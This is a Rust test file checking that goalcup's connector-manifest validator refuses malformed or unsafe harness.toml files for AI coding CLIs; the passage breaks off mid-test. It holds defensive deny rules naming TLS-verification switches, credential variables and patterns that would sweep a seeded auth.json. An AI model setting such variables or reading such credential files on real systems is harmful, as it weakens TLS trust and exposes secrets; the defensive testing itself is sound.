//! The schema-1 refusal table (harness contract v1, S2). Runs in CI on a fork PR: it lives in
//! the protocol crate, which `ci.yml` does not exclude.
//!
//! Every row of the S2 refusal table has a test that builds an otherwise valid manifest, makes
//! the one change the row names, and asserts the refusal carries the row's own sentence (so a
//! test cannot pass because some other rule happened to fire). Where a rule has an exemption
//! (`Origin::Dev`, a registry row, `SHELL`), the accept case sits beside the refuse case.
//!
//! The three shipped connectors' `harness.toml`, as the design wrote them, are frozen baselines
//! under `tests/fixtures/harness/`: each row mutates one value of a known-good file, so the
//! baseline must not move when a harness PR edits a real connector. The real
//! `connectors/<id>/harness.toml` files are checked by `harness_conformance.rs` and
//! `harness_legacy_equal.rs`. Initially copied from those files, the fixtures are independent
//! frozen baselines: no test asserts equality, and a real file may move without them.

use goalcup_protocol::ProtocolError;
use goalcup_protocol::capture_policy::{
    CREDENTIAL_ENV, EnvContext, INJECTION_ENV, INJECTION_PREFIXES, INTERPRETER_PROGRAMS,
    PROVIDER_PREFIXES, SHELL_VALUES, STARTUP_BASENAMES, STARTUP_COMPONENTS, arg_path_denied,
    env_key_denied, env_value_denied, is_interpreter_program, startup_file_problem,
};
use goalcup_protocol::harness::{HarnessManifest, NEWER_SENTENCE, Origin, PlatformKey};
use std::path::{Path, PathBuf};
use toml::{Table, Value};

fn fixture_path(id: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/harness")
        .join(format!("{id}.toml"))
}

fn fixture_text(id: &str) -> String {
    std::fs::read_to_string(fixture_path(id)).unwrap_or_else(|e| panic!("{id}: {e}"))
}

fn fixture(id: &str) -> Table {
    fixture_text(id).parse().expect("a fixture is TOML")
}

/// The table at `path`; an array of tables (`native`, `hosts`) is entered at its first entry.
fn tbl<'a>(t: &'a mut Table, path: &[&str]) -> &'a mut Table {
    let mut cur = t;
    for seg in path {
        let next = cur
            .get_mut(*seg)
            .unwrap_or_else(|| panic!("no `{seg}` in the fixture"));
        cur = match next {
            Value::Table(t) => t,
            Value::Array(a) => a[0].as_table_mut().expect("an array of tables"),
            other => panic!("`{seg}` is {other:?}"),
        };
    }
    cur
}

fn set(t: &mut Table, path: &[&str], key: &str, v: impl Into<Value>) {
    tbl(t, path).insert(key.to_string(), v.into());
}

fn strings(items: &[&str]) -> Value {
    Value::Array(
        items
            .iter()
            .map(|s| Value::String((*s).to_string()))
            .collect(),
    )
}

/// Parse and validate `t`, returning the refusal text, or `None` when it is admitted.
fn outcome(t: &Table, origin: Origin) -> Option<String> {
    let text = toml::to_string(t).expect("serialize");
    let m = match HarnessManifest::from_toml_str(&text) {
        Ok(m) => m,
        Err(e) => return Some(e.to_string()),
    };
    m.validate(origin).err().map(|e| e.to_string())
}

/// `t` must be refused and the refusal must contain every needle.
#[track_caller]
fn refused(t: &Table, origin: Origin, needles: &[&str]) {
    let Some(msg) = outcome(t, origin) else {
        panic!("the manifest was admitted; expected a refusal naming {needles:?}");
    };
    for n in needles {
        assert!(msg.contains(n), "refusal lacks `{n}`: {msg}");
    }
}

#[track_caller]
fn admitted(t: &Table, origin: Origin) {
    if let Some(msg) = outcome(t, origin) {
        panic!("the manifest was refused: {msg}");
    }
}

const PINNED: Origin = Origin::Pinned;
const DEV: Origin = Origin::Dev;

/// Hermes with the keyed credential row, the claude and codex shapes, and a controlled
/// workload: the four identity shapes a row can need.
fn hermes() -> Table {
    fixture("hermes-cli")
}
fn codex() -> Table {
    fixture("codex-cli")
}
fn claude() -> Table {
    fixture("claude-code-cli")
}

/// The controlled workload as schema 1 (`m2-controlled-workload`, design §2.10): a Dev-only
/// connector that runs `python3` with absolute paths, has no session identity, and an unknown
/// wire hint.
fn workload() -> Table {
    r#"
schema_version = 1
id = "m2-controlled-workload"

[capture]
auth_hosts = ["auth.e00.localhost"]
continuation = "none: one fixed traffic plan, no input after the goal"
args = ["/work/tests/fixtures/m2-controlled-workload.py", "/work/config.json", "--"]

[capture.executable]
program = "python3"

[capture.home]
run_home = "empty"
config_home = "shared"
env = "WORKLOAD_HOME"
real_dirs = ["{user_home}/.workload"]

[capture.ca]
env = ["NODE_EXTRA_CA_CERTS"]
mode = "extend"

[capture.identity]
source = "none"

[[capture.native]]
name = "workload"
root = "{run_home}"
pattern = "native/*.jsonl"
form = "append_only"

[[capture.hosts]]
host = "api.e00.localhost"
evidence_paths = ["/v1/echo", "/v1/sse", "/v1/ws", "/v1/bulk"]
protocol_hint = "e00-controlled"
"#
    .parse()
    .expect("TOML")
}

// ---------------------------------------------------------------------------------------
// The three shipped connectors, and the controlled workload
// ---------------------------------------------------------------------------------------

#[test]
fn the_three_shipped_connectors_validate_as_pinned() {
    for id in ["hermes-cli", "codex-cli", "claude-code-cli"] {
        let text = fixture_text(id);
        let m = HarnessManifest::from_toml_str(&text).unwrap_or_else(|e| panic!("{id}: {e}"));
        assert_eq!(m.id, id);
        m.validate(PINNED).unwrap_or_else(|e| panic!("{id}: {e}"));
        m.validate(DEV)
            .unwrap_or_else(|e| panic!("{id} as Dev: {e}"));
    }
}

#[test]
fn the_controlled_workload_is_admitted_under_dev_and_refused_under_pinned() {
    // N1: it runs python3 with absolute paths in `args`; both rules relax for Dev, and
    // nothing else does.
    admitted(&workload(), DEV);
    refused(&workload(), PINNED, &["interpreter", "python3"]);
    // Under Pinned, with the interpreter rule satisfied, the absolute path is the refusal.
    let mut t = workload();
    set(
        &mut t,
        &["capture", "executable"],
        "program",
        "workload-runner",
    );
    refused(
        &t,
        PINNED,
        &[
            "absolute path",
            "/work/tests/fixtures/m2-controlled-workload.py",
        ],
    );
    admitted(&t, DEV);
    // An unknown protocol_hint is capture-only, not refused (D43 ruling 8).
    admitted(&t, DEV);
}

#[test]
fn the_parsed_fixtures_carry_the_values_the_design_gives() {
    let h = HarnessManifest::from_toml_str(&fixture_text("hermes-cli")).unwrap();
    assert_eq!(h.capture.home.env.as_deref(), Some("HERMES_HOME"));
    assert_eq!(h.capture.home.seed.len(), 3);
    assert_eq!(h.capture.native[0].pattern, "session_{id}.json");
    assert_eq!(
        h.capture.credential.as_ref().unwrap().env,
        "DEEPSEEK_API_KEY"
    );
    assert_eq!(h.termination().grace_seconds(), 10);
    assert!(h.capture.argv_guard.as_ref().unwrap().long_abbreviations);
    let c = HarnessManifest::from_toml_str(&fixture_text("codex-cli")).unwrap();
    assert_eq!(c.termination().native_binary.as_deref(), Some("codex"));
    assert_eq!(c.redaction.as_ref().unwrap().extra_patterns.len(), 3);
    let k = HarnessManifest::from_toml_str(&fixture_text("claude-code-cli")).unwrap();
    assert_eq!(
        k.capture.identity.binding.map(|b| b.as_str()),
        Some("at_launch")
    );
    assert_eq!(k.capture.home.per_run_dir_name(), "harness-home");
}

// ---------------------------------------------------------------------------------------
// Parsing: schema version, unknown keys, unknown values
// ---------------------------------------------------------------------------------------

#[test]
fn a_missing_schema_version_is_refused() {
    let mut t = hermes();
    t.remove("schema_version");
    refused(&t, PINNED, &["no `schema_version`", "schema_version = 1"]);
}

#[test]
fn another_schema_version_or_a_non_integer_gets_the_newer_goalcup_message() {
    for v in [
        Value::Integer(2),
        Value::Integer(0),
        Value::Integer(-1),
        "1".into(),
    ] {
        let mut t = hermes();
        t.insert("schema_version".into(), v);
        refused(
            &t,
            PINNED,
            &[
                "reads connector schema 1",
                "newer schema needs a newer goalcup",
            ],
        );
    }
}

#[test]
fn an_unknown_key_is_refused_with_its_table_and_the_schema_sentence() {
    // `xdg` was cut (I3); the V1 `automatic_goal` and `family` are not schema-1 fields (D43
    // ruling 2); `server` and `upload` have no field at all (F7).
    let cases: Vec<(&[&str], &str, Value)> = vec![
        (&["capture", "home"], "xdg", true.into()),
        (&["capture"], "automatic_goal", true.into()),
        (&[], "family", "hermes".into()),
        (&[], "tier", "full".into()),
        (&[], "capture_only", true.into()),
        (&["capture"], "server", "https://example.org".into()),
        (&["capture"], "upload", true.into()),
        (&["capture", "identity"], "pty", true.into()),
    ];
    for (path, key, value) in cases {
        let mut t = hermes();
        set(&mut t, path, key, value);
        let msg = outcome(&t, PINNED).unwrap_or_else(|| panic!("`{key}` was admitted"));
        assert!(msg.contains(&format!("`{key}`")), "{msg}");
        assert!(msg.contains(NEWER_SENTENCE), "{msg}");
        assert!(msg.contains("newer goalcup"), "{msg}");
    }
    // The table path is named.
    let mut t = hermes();
    set(&mut t, &["capture", "home"], "xdg", true);
    refused(&t, PINNED, &["[capture.home]"]);
}

#[test]
fn an_unknown_value_of_a_closed_field_is_refused_with_the_same_sentence() {
    // Including `grammar = "uuid"`, which v2 cut (M8).
    let cases: Vec<(&[&str], &str, &str)> = vec![
        (&["capture", "identity"], "grammar", "uuid"),
        (&["capture", "identity"], "source", "pty"),
        (&["capture", "identity"], "binding", "eventually"),
        (&["capture", "home"], "run_home", "tmp"),
        (&["capture", "home"], "config_home", "private"),
        (&["capture", "ca"], "mode", "append"),
        (&["capture", "termination"], "strategy", "wrapper_unsafe"),
        (&["capture", "native"], "form", "log"),
    ];
    for (path, key, value) in cases {
        let mut t = hermes();
        set(&mut t, path, key, value);
        let msg = outcome(&t, PINNED).unwrap_or_else(|| panic!("`{value}` was admitted"));
        assert!(msg.contains(&format!("`{value}`")), "{msg}");
        assert!(msg.contains(key), "the field is named: {msg}");
        assert!(msg.contains("newer goalcup"), "{msg}");
        assert!(
            !msg.contains("unknown variant"),
            "serde's own text never reaches the user: {msg}"
        );
    }
    let mut t = hermes();
    set(&mut t, &["capture", "home", "seed"], "mode", "0644");
    refused(&t, PINNED, &["`0644`", "newer goalcup"]);
}

#[test]
fn a_sqlite_store_is_a_core_capability_not_schema_one() {
    let mut t = hermes();
    set(&mut t, &["capture", "native"], "form", "sqlite");
    refused(&t, PINNED, &["SQLite", "core capability", "D42"]);
}

#[test]
fn a_missing_required_table_is_a_plain_parse_error() {
    let mut t = hermes();
    tbl(&mut t, &["capture"]).remove("ca");
    refused(&t, PINNED, &["missing field `ca`"]);
}

// ---------------------------------------------------------------------------------------
// Refusal table: native source
// ---------------------------------------------------------------------------------------

#[test]
fn no_native_source_is_refused() {
    let mut t = hermes();
    tbl(&mut t, &["capture"]).remove("native");
    refused(
        &t,
        PINNED,
        &["without a native session store", "exactly one"],
    );
}

#[test]
fn two_native_sources_are_refused() {
    let mut t = hermes();
    let first = tbl(&mut t, &["capture"])["native"].as_array().unwrap()[0].clone();
    tbl(&mut t, &["capture"])["native"]
        .as_array_mut()
        .unwrap()
        .push(first);
    refused(&t, PINNED, &["exactly one `[[capture.native]]`"]);
}

#[test]
fn a_snapshot_store_takes_no_hint_and_an_append_only_hint_has_a_grammar() {
    let mut t = hermes();
    set(
        &mut t,
        &["capture", "native"],
        "protocol_hint",
        "codex-jsonl",
    );
    refused(&t, PINNED, &["`append_only` stores only"]);
    let mut t = claude();
    set(
        &mut t,
        &["capture", "native"],
        "protocol_hint",
        "Claude_JSONL",
    );
    refused(&t, PINNED, &["`Claude_JSONL`", "^[a-z]"]);
    // An unknown but well-formed native hint is capture-only.
    let mut t = claude();
    set(
        &mut t,
        &["capture", "native"],
        "protocol_hint",
        "some-new-jsonl",
    );
    admitted(&t, PINNED);
}

/// One record field, one key: the native store spells it `protocol_hint` like a host does, and
/// the old spelling `hint` is a key schema 1 does not have.
#[test]
fn a_native_store_names_its_hint_protocol_hint() {
    let mut t = claude();
    let native = &mut tbl(&mut t, &["capture"])["native"].as_array_mut().unwrap()[0];
    let hint = native
        .as_table_mut()
        .unwrap()
        .remove("protocol_hint")
        .expect("the shipped Claude store carries a protocol_hint");
    native.as_table_mut().unwrap().insert("hint".into(), hint);
    refused(&t, PINNED, &["`hint`", "newer goalcup"]);
}

/// The one grammar and one bound, on both ends of the same record field: the native store and
/// the wire host refuse a leading digit and a 65-byte hint. (The V1 manifest refuses the same
/// two, `tests/it/manifest_load.rs`.)
#[test]
fn both_hint_homes_refuse_a_leading_digit_and_sixty_five_bytes() {
    for hint in ["1foo".to_string(), "a".repeat(65)] {
        let mut t = claude();
        set(
            &mut t,
            &["capture", "native"],
            "protocol_hint",
            hint.clone(),
        );
        refused(&t, PINNED, &["capture.native.protocol_hint"]);
        let mut t = codex();
        set(&mut t, &["capture", "hosts"], "protocol_hint", hint);
        refused(&t, PINNED, &["capture.hosts.protocol_hint"]);
    }
}

#[test]
fn the_native_root_and_pattern_follow_their_grammar() {
    let bad_roots = [
        "/abs",
        "{config_home}x",
        "{home}/x",
        "{config_home}/../x",
        "{config_home}/a/./b",
    ];
    for root in bad_roots {
        let mut t = hermes();
        set(&mut t, &["capture", "native"], "root", root);
        refused(&t, PINNED, &["capture.native.root"]);
    }
    let bad_patterns = [
        ("/abs/{id}.json", "relative"),
        ("a/../{id}.json", "`.` or `..`"),
        ("**/{id}.json", "`**`"),
        ("{id}/{id}.json", "more than one `{id}`"),
        ("session.json", "needs `{id}`"),
        ("{foo}-{id}.json", "no brace but `{id}`"),
        ("a b/{id}.json", "outside"),
        ("a//{id}.json", "empty component"),
    ];
    for (pattern, needle) in bad_patterns {
        let mut t = hermes();
        set(&mut t, &["capture", "native"], "pattern", pattern);
        refused(&t, PINNED, &["capture.native.pattern", needle]);
    }
    let mut t = hermes();
    set(
        &mut t,
        &["capture", "native"],
        "pattern",
        "a/b/c/d/e/f/g/h/{id}.json",
    );
    refused(&t, PINNED, &["more than eight components"]);
    let mut t = hermes();
    set(&mut t, &["capture", "native"], "name", "bad name");
    refused(&t, PINNED, &["capture.native.name"]);
}

#[test]
fn a_native_pattern_that_matches_a_seed_is_refused() {
    // Hermes seeds `auth.json` into the config home; a source that reads `*.json` there would
    // sweep the credential store (M10).
    let mut t = hermes();
    set(&mut t, &["capture", "native"], "root", "{config_home}");
    set(&mut t, &["capture", "native"], "pattern", "{id}.json");
    refused(&t, PINNED, &["matches the seed", "auth.json"]);
    // Nested: root under a directory, seed in it.
    let mut t = hermes();
    tbl(&mut t, &["capture", "home"])["seed"]
        .as_array_mut()
        .unwrap()
        .push(Value::Table(
            [(
                "file".to_string(),
                Value::String("sessions/session_x.json".into()),
            )]
            .into_iter()
            .collect(),
        ));
    refused(&t, PINNED, &["matches the seed", "sessions/session_x.json"]);
    // The shipped shape, `sessions/session_{id}.json` beside three non-matching seeds, passes.
    admitted(&hermes(), PINNED);
}

/// S2 review M-5: the seed-overlap check also covers `{run_home}` roots, because where S4 puts
/// the per-run config home relative to the run home is not the schema's to assume. It is checked
/// as the same directory and as `<per_run_dir>/...` under the run home, case-insensitively (APFS).
#[test]
fn a_run_home_native_root_may_not_sweep_a_seed_either() {
    let aim = |root: &str, pattern: &str| {
        let mut t = hermes();
        set(&mut t, &["capture", "native"], "root", root);
        set(&mut t, &["capture", "native"], "pattern", pattern);
        t
    };
    // The same directory: `{id}.json` reads `auth.json` under the run home.
    refused(
        &aim("{run_home}", "{id}.json"),
        PINNED,
        &["matches the seed", "auth.json", "run home"],
    );
    refused(
        &aim("{run_home}", "config{id}.yaml"),
        PINNED,
        &["matches the seed", "config.yaml"],
    );
    // Nested: Hermes's per-run config home is `hermes`, so `{run_home}/hermes/...` is the seeds.
    refused(
        &aim("{run_home}/hermes", "config{id}.yaml"),
        PINNED,
        &["matches the seed", "config.yaml"],
    );
    refused(
        &aim("{run_home}/hermes", "{id}.json"),
        PINNED,
        &["matches the seed", "auth.json"],
    );
    // APFS folds case: neither spelling hides a seed, under either home.
    refused(
        &aim("{run_home}", "CONFIG{id}.YAML"),
        PINNED,
        &["matches the seed"],
    );
    refused(
        &aim("{run_home}/HERMES", "{id}.JSON"),
        PINNED,
        &["matches the seed"],
    );
    refused(
        &aim("{config_home}", "CONFIG{id}.YAML"),
        PINNED,
        &["matches the seed"],
    );
    // A root that cannot be a seed's path is fine, as is the shipped shape.
    admitted(&aim("{run_home}/sessions", "session_{id}.json"), PINNED);
    admitted(
        &aim("{run_home}/hermes/sessions", "session_{id}.json"),
        PINNED,
    );
    admitted(&aim("{config_home}/sessions", "session_{id}.json"), PINNED);
    // A harness that seeds nothing has nothing to sweep.
    let mut t = claude();
    set(&mut t, &["capture", "native"], "root", "{run_home}");
    set(&mut t, &["capture", "native"], "pattern", "{id}.jsonl");
    admitted(&t, PINNED);
}

#[test]
fn identity_none_needs_a_per_run_root_and_no_id_placeholder() {
    let mut t = workload();
    set(
        &mut t,
        &["capture", "native"],
        "pattern",
        "native/{id}.jsonl",
    );
    refused(&t, DEV, &["names `{id}`", "identity.source = \"none\""]);
    // A shared config home is not per run.
    let mut t = workload();
    set(&mut t, &["capture", "native"], "root", "{config_home}");
    refused(&t, DEV, &["must be per run"]);
    // The same root with `per_run` is fine.
    set(&mut t, &["capture", "home"], "config_home", "per_run");
    admitted(&t, DEV);
}

// ---------------------------------------------------------------------------------------
// Refusal table: identity and credential
// ---------------------------------------------------------------------------------------

fn with_credential(mut t: Table, per_run: bool) -> Table {
    t.get_mut("capture")
        .and_then(Value::as_table_mut)
        .unwrap()
        .insert(
            "credential".into(),
            Value::Table(
                [("env".to_string(), Value::String("DEEPSEEK_API_KEY".into()))]
                    .into_iter()
                    .collect(),
            ),
        );
    if per_run {
        set(&mut t, &["capture", "home"], "config_home", "per_run");
    }
    t
}

#[test]
fn a_credential_with_preassigned_identity_is_refused() {
    // Even with the per-run home, so the identity pair is what refuses.
    refused(
        &with_credential(claude(), true),
        PINNED,
        &["credential", "`preassigned`", "not supported by this build"],
    );
}

#[test]
fn a_credential_with_no_identity_is_refused() {
    refused(
        &with_credential(workload(), true),
        DEV,
        &["credential", "`none`", "not supported by this build"],
    );
}

#[test]
fn a_credential_with_stdout_json_identity_is_admitted_with_a_per_run_home() {
    // One stdout reader feeds both the key-fragment scan and the identity matcher, so the pair
    // is admitted; the key-fragment scan still needs the run directory to hold the config home.
    admitted(&with_credential(codex(), true), PINNED);
    refused(
        &with_credential(codex(), false),
        PINNED,
        &["per_run", "key-fragment scan", "D41"],
    );
}

#[test]
fn a_credential_without_a_per_run_home_is_refused() {
    let mut t = hermes();
    set(&mut t, &["capture", "home"], "config_home", "shared");
    refused(&t, PINNED, &["per_run", "key-fragment scan", "D41"]);
}

#[test]
fn the_credential_name_is_a_closed_list() {
    for name in [
        "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY",
        "MY_KEY",
        "deepseek_api_key",
        "amp_api_key",
    ] {
        let mut t = hermes();
        set(&mut t, &["capture", "credential"], "env", name);
        refused(
            &t,
            PINNED,
            &["not one of the provider credential variables"],
        );
    }
    assert_eq!(CREDENTIAL_ENV, ["DEEPSEEK_API_KEY", "AMP_API_KEY"]);
}

#[test]
fn amp_credential_is_admitted_only_in_credential_field() {
    // The Hermes fixture already has a per-run home and `stderr_line` identity, so the name is
    // the only change.
    let mut t = hermes();
    set(&mut t, &["capture", "credential"], "env", "AMP_API_KEY");
    admitted(&t, PINNED);
    // The same name as a manifest env pin is a credential in a manifest, which is never allowed.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "AMP_API_KEY", "x");
    refused(
        &t,
        PINNED,
        &[
            "capture.env",
            "AMP_API_KEY",
            "would carry a credential, and a manifest never does",
        ],
    );
    // Admitting the name does not lift the identity or home rules for it.
    let mut t = with_credential(claude(), true);
    set(&mut t, &["capture", "credential"], "env", "AMP_API_KEY");
    refused(&t, PINNED, &["credential", "`preassigned`"]);
    let mut t = hermes();
    set(&mut t, &["capture", "credential"], "env", "AMP_API_KEY");
    set(&mut t, &["capture", "home"], "config_home", "shared");
    refused(&t, PINNED, &["per_run", "key-fragment scan"]);
}

#[test]
fn only_the_admitted_identity_pairs_load() {
    // stdout_json+deferred, stderr_line+at_launch, preassigned+deferred.
    for (source, binding) in [
        ("stdout_json", "deferred"),
        ("stderr_line", "at_launch"),
        ("preassigned", "deferred"),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "identity"], "source", source);
        set(&mut t, &["capture", "identity"], "binding", binding);
        // Sibling fields are removed so the pair is the refusal, not a stray field.
        let id = tbl(&mut t, &["capture", "identity"]);
        if source != "stdout_json" {
            for k in ["match_field", "match_value", "id_field"] {
                id.remove(k);
            }
        }
        if source == "stderr_line" {
            id.insert("prefix".into(), "sid: ".into());
            id.insert("grammar".into(), "token".into());
        }
        if source == "preassigned" {
            set(
                &mut t,
                &["capture"],
                "args",
                strings(&["--id", "{session_id}", "--"]),
            );
        }
        refused(&t, PINNED, &["not supported by this build", binding]);
    }
    // `none` takes no binding; every other source needs one.
    let mut t = workload();
    set(&mut t, &["capture", "identity"], "binding", "at_launch");
    refused(&t, DEV, &["takes no `binding`"]);
    let mut t = codex();
    tbl(&mut t, &["capture", "identity"]).remove("binding");
    refused(&t, PINNED, &["binding", "required"]);
}

#[test]
fn identity_fields_belong_to_their_source() {
    let mut t = codex();
    tbl(&mut t, &["capture", "identity"]).remove("id_field");
    refused(&t, PINNED, &["`stdout_json` needs"]);
    let mut t = codex();
    set(&mut t, &["capture", "identity"], "match_field", "a.b.c.d.e");
    refused(&t, PINNED, &["match_field", "dot path"]);
    let mut t = codex();
    set(&mut t, &["capture", "identity"], "prefix", "x: ");
    refused(&t, PINNED, &["belong to `stderr_line`"]);
    let mut t = hermes();
    tbl(&mut t, &["capture", "identity"]).remove("prefix");
    refused(&t, PINNED, &["`stderr_line` needs"]);
    let mut t = hermes();
    set(&mut t, &["capture", "identity"], "prefix", "p\u{e9}");
    refused(&t, PINNED, &["printable ASCII"]);
    let mut t = hermes();
    set(&mut t, &["capture", "identity"], "match_field", "type");
    refused(&t, PINNED, &["belong to `stdout_json`"]);
    let mut t = claude();
    set(&mut t, &["capture", "identity"], "prefix", "x");
    refused(&t, PINNED, &["takes no"]);
}

#[test]
fn session_id_and_preassigned_imply_each_other() {
    let mut t = claude();
    set(&mut t, &["capture"], "args", strings(&["-p", "--"]));
    refused(&t, PINNED, &["`preassigned` needs `{session_id}`"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&["exec", "{session_id}", "--"]),
    );
    refused(&t, PINNED, &["`{session_id}` needs", "preassigned"]);
    // In an env value too.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "RUN_TAG", "{session_id}");
    refused(&t, PINNED, &["`{session_id}` needs"]);
}

// ---------------------------------------------------------------------------------------
// Refusal table: CA
// ---------------------------------------------------------------------------------------

/// A CA variable can never be set through another field: `capture.env` or `home.env`, whatever
/// its case. The rule is the CA-name shape itself (the shared rows and the suffixes), so a
/// harness's own CA variable cannot be set in `capture.env` either; `TRUST_ONLY` names stay
/// refused in every field, `capture.ca` included.
#[test]
fn every_ca_variable_is_refused_as_a_capture_env_key_and_as_home_env() {
    use goalcup_protocol::capture_policy::{SHARED_CA_ENV, TRUST_ONLY, is_ca_env_name};
    let names = [
        "SSL_CERT_FILE",
        "REQUESTS_CA_BUNDLE",
        "NODE_EXTRA_CA_CERTS",
        "CODEX_CA_CERTIFICATE",
        "HERMES_CA_BUNDLE",
        "NEWTOOL_CA_FILE",
        "NEWTOOL_CA_CERT",
        "NEWTOOL_CA_CERTIFICATES",
    ];
    for name in names.iter().chain(SHARED_CA_ENV) {
        assert!(is_ca_env_name(name), "{name}");
        for spelling in [name.to_string(), name.to_ascii_lowercase()] {
            for ctx in [EnvContext::CaptureEnv, EnvContext::HomeEnv] {
                let why = env_key_denied(&spelling, ctx)
                    .unwrap_or_else(|| panic!("`{spelling}` admitted for {ctx:?}"));
                assert!(why.contains("certificate trust"), "{spelling}: {why}");
            }
        }
        let mut t = hermes();
        set(&mut t, &["capture", "env"], name, "x");
        refused(&t, PINNED, &["capture.env", name, "certificate trust"]);
        let mut t = hermes();
        set(&mut t, &["capture", "home"], "env", *name);
        refused(&t, PINNED, &["capture.home.env", name, "certificate trust"]);
    }
    // A directory of roots, curl's own bundle and the verification switch stay refused
    // everywhere.
    assert_eq!(
        TRUST_ONLY,
        [
            "SSL_CERT_DIR",
            "CURL_CA_BUNDLE",
            "NODE_TLS_REJECT_UNAUTHORIZED"
        ]
    );
    for name in TRUST_ONLY {
        assert!(!SHARED_CA_ENV.contains(name), "{name}");
        for ctx in [
            EnvContext::CaptureEnv,
            EnvContext::HomeEnv,
            EnvContext::CaEnv,
        ] {
            assert!(env_key_denied(name, ctx).is_some(), "{name} {ctx:?}");
        }
        for mode in ["extend", "replace"] {
            let mut t = hermes();
            set(&mut t, &["capture", "ca"], "env", strings(&[name]));
            set(&mut t, &["capture", "ca"], "mode", mode);
            refused(&t, PINNED, &["capture.ca.env", name, "certificate trust"]);
        }
    }
}

/// A harness's own CA variable is connector data held to one closed shape; the shared rows
/// (`SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`) take `extend`, since the launch hands them the system
/// roots plus the proxy CA, so a `replace` profile, which fails closed, never names one; and a CA
/// name is still held to the shared env-name rules.
#[test]
fn a_ca_variable_is_data_held_to_the_ca_shape_and_the_shared_rules() {
    use goalcup_protocol::capture_policy::{CaMode, ca_env_problem};
    // Any connector, either mode, names its own CA variable: no core row needed.
    for (name, mode) in [
        ("NEWTOOL_CA_CERTIFICATE", "extend"),
        ("NEWTOOL_CA_BUNDLE", "replace"),
        ("NODE_EXTRA_CA_CERTS", "replace"),
        ("HERMES_CA_BUNDLE", "extend"),
        ("SSL_CERT_FILE", "extend"),
        ("REQUESTS_CA_BUNDLE", "extend"),
    ] {
        let mut t = claude();
        set(&mut t, &["capture", "ca"], "env", strings(&[name]));
        set(&mut t, &["capture", "ca"], "mode", mode);
        admitted(&t, PINNED);
    }
    // Both shared rows together, and a shared row beside a harness's own extending variable.
    for names in [
        ["SSL_CERT_FILE", "REQUESTS_CA_BUNDLE"],
        ["SSL_CERT_FILE", "NODE_EXTRA_CA_CERTS"],
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "ca"], "env", strings(&names));
        set(&mut t, &["capture", "ca"], "mode", "extend");
        admitted(&t, PINNED);
    }
    // A shared row is handed the system's roots too, so it cannot be a `replace` profile's
    // name: that profile trusts the proxy alone and fails closed (D41).
    for names in [
        &["SSL_CERT_FILE"][..],
        &["REQUESTS_CA_BUNDLE"],
        &["HERMES_CA_BUNDLE", "SSL_CERT_FILE"],
    ] {
        let name = names.last().unwrap();
        let mut t = codex();
        set(&mut t, &["capture", "ca"], "env", strings(names));
        set(&mut t, &["capture", "ca"], "mode", "replace");
        refused(&t, PINNED, &["capture.ca.env", name, "mode = \"extend\""]);
        assert!(ca_env_problem(name, CaMode::Extend).is_none(), "{name}");
    }
    // Not a CA name, or not upper case.
    for (name, why) in [
        ("MY_CA", "is not a CA variable"),
        ("NEWTOOL_HOME", "is not a CA variable"),
        ("BASH_ENV", "is not a CA variable"),
        ("CA_BUNDLE", "is not a CA variable"),
        ("newtool_ca_bundle", "upper-case"),
        ("NEWTOOL-CA-BUNDLE", "upper-case"),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "ca"], "env", strings(&[name]));
        refused(&t, PINNED, &["capture.ca.env", name, why]);
    }
    // A CA-shaped name is still held to the shared rules: a provider, a git, an OpenSSL or a
    // tracker namespace, a proxy or a credential.
    for (name, why) in [
        ("AWS_CA_BUNDLE", "provider"),
        ("OPENAI_CA_CERTS", "model provider"),
        ("GIT_SSL_CA_FILE", "configures git"),
        ("OPENSSL_CA_FILE", "OpenSSL"),
        ("GOALCUP_CA_BUNDLE", "tracker"),
        ("NPM_CONFIG_CA_FILE", "npm"),
        ("AUTH_CA_CERT", "credential"),
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "ca"], "env", strings(&[name]));
        refused(&t, PINNED, &["capture.ca.env", name, why]);
    }
    // One or two names, never repeated.
    let mut t = codex();
    set(&mut t, &["capture", "ca"], "env", strings(&[]));
    refused(&t, PINNED, &["1 or 2 CA variables"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "ca"],
        "env",
        strings(&["A_CA_CERT", "B_CA_CERT", "C_CA_CERT"]),
    );
    refused(&t, PINNED, &["1 or 2 CA variables"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture", "ca"],
        "env",
        strings(&["CODEX_CA_CERTIFICATE", "CODEX_CA_CERTIFICATE"]),
    );
    refused(&t, PINNED, &["named twice"]);
}

#[test]
fn a_ca_variable_in_capture_env_is_refused_and_says_where_it_belongs() {
    for name in [
        "NODE_EXTRA_CA_CERTS",
        "HERMES_CA_BUNDLE",
        "CODEX_CA_CERTIFICATE",
        "SSL_CERT_FILE",
        "REQUESTS_CA_BUNDLE",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "x");
        refused(&t, PINNED, &["belongs in `capture.ca`"]);
    }
    for name in ["SSL_CERT_DIR", "CURL_CA_BUNDLE"] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "x");
        refused(&t, PINNED, &["certificate trust"]);
    }
}

// ---------------------------------------------------------------------------------------
// Refusal table: delivery-agnostic (F7)
// ---------------------------------------------------------------------------------------

#[test]
fn server_upload_and_goalcup_names_are_refused() {
    // A GOALCUP_ env key, in any case.
    for key in ["GOALCUP_SERVER", "goalcup_upload_url", "GOALCUP_"] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], key, "x");
        refused(&t, PINNED, &["capture.env", "tracker"]);
    }
    // `goalcup` in an arg, an env value, a host, an auth host, the goal flag.
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&["exec", "--tag", "goalcup", "--"]),
    );
    refused(&t, PINNED, &["capture.args", "delivery-agnostic"]);
    let mut t = codex();
    set(&mut t, &["capture", "env"], "RUN_TAG", "A-GoalCup-run");
    refused(&t, PINNED, &["capture.env", "delivery-agnostic"]);
    let mut t = codex();
    set(&mut t, &["capture", "hosts"], "host", "api.goalcup.example");
    refused(&t, PINNED, &["tracker's own host"]);
    let mut t = codex();
    set(
        &mut t,
        &["capture"],
        "auth_hosts",
